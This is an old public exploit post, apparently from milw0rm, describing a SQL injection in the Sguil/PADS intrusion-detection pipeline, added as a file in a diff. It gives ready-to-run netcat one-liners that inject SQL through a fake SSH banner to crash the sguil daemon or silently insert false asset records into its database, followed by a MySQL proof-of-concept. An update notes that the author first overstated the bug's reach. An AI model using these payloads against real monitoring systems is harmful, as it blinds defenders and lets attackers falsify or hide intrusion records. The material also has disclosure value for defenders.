@@ -1,0 +1,81 @@
+Sguil/PADS Denial of Service exploit
+by Ataraxia (Benjamin Rose)
+Public announcement made 7/15/09.
+
+Please visit http://allmybase.com/ (my blog) for more up-to-date
+information, and a quick patch.
+
+More in-depth article available at: http://allmybase.com/?p=72
+
+This more in-depth article does include additional details and
+the actual code that is being exploited, if you're interested...
+
+##########################################################################
+UPDATE 7/17/09 @ 14:41:
+In speaking with the creators of the sguil software, it seems that
+I have greatly overestimated the reach of this bug. I had assumed that
+it would be possible to run multiple SQL commands within a single TCL
+mysqlexec() statement, an assumption that now seems incorrect. This means
+that, at best, this hole becomes a denial of service attack that could
+inject incorrect data into the sguil database, and/or kill the sguil
+daemon, a noisy operation. My apologies for this initial overzealousness.
+##########################################################################
+
+ORIGINAL POST, UNMODIFIED:
+This exploit has the ability to render any Intrusion Detection
+System utilizing the sguil monitoring useless. At the lowest level,
+you can kill the master logging daemon that collates the data into
+a MySQL database. I've also been able to inject random and useless
+data into the MySQL database, which opens the door for an obfuscation
+of an attack, or a flat-out denial of service attack. There also exists
+the possibility of dropping the database altogether, though I was not
+able to make this happen during my preliminary testing of the attack.
+
+The sguil sensor boxes report back to a sguil daemon on a management server,
+which in turn puts the data received into a MySQL database. The sensor
+collects data from many sensor agents, the most popular ones including snort
+and sancp. Since snort is the de-facto standard NIDS, sguil is found in a lot
+of places where there are mission-critical NIDS, making this a potent
+vulnerability. The idea here is to craft a special packet containing a SQL
+statement and send it across the wire, such that the sguil-agents will pick up
+on it. We will exploit the Passive Asset Detection System (PADS) -> sguil
+relationship, which will be monitoring for said banner packets. Thanks to the
+availability of the netcat program, there is also no need for any programming
+skill. Also, the attack can run on any port, so even an unprivileged user
+could potentially run this attack.
+
+Without further ado, here's the good stuff:
+
+TO CRASH THE SERVER:
+from a box that has its traffic monitored, run
+echo “SSH-2.0-OpenSSH_1.4′,’deadbeefcafe’);–” | nc -l 7777
+...and then telnet to port 7777 from another box. There will be a syntax
+error in the sguil management daemon's SQL insert statement, and it will
+crash rather ungracefully. This is highly noticable, so be careful!
+
+TO INJECT DATA SILENTLY:
+from a box that has its traffic monitored, run
+echo “SSH-2.0-OpenSSH_1.4′,’deadbeefcafe’)–” | nc -l 8888
+...and then telnet to port 8888 from another box. The difference here is the
+semicolon in the statement. This will insert an asset into the SQL database as
+ssh version 1.4, protocol 2.0. Obviously, you can have some fun with this ;-)
+
+PROOF OF CONCEPT:
+mysql> use sguildb;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> select * from pads where `hex_payload`=’deadbeefcafe’;
++————–+—–+———-+———————+————+———+——+———-+————-+————–+
+| hostname | sid | asset_id | timestamp | ip | service | port | ip_proto | application | hex_payload |
++————–+—–+———-+———————+————+———+——+———-+————-+————–+
+| [REMOVED] | 1 | 7 | 2009-06-08 14:28:02 | [REMOVED] | ssh | 1061 | 6 | OpenSSH 1.4 | deadbeefcafe |
++————–+—–+———-+———————+————+———+——+———-+————-+————–+
+1 row in set (0.01 sec) 
+
+
+Note that you don't even need to put in legit hex into the attack for it to work. Bonus points
+if you put in a hexadecimal message to the sysadmin that doesn't even contain legit hex.
+
+# milw0rm.com [2009-07-17]
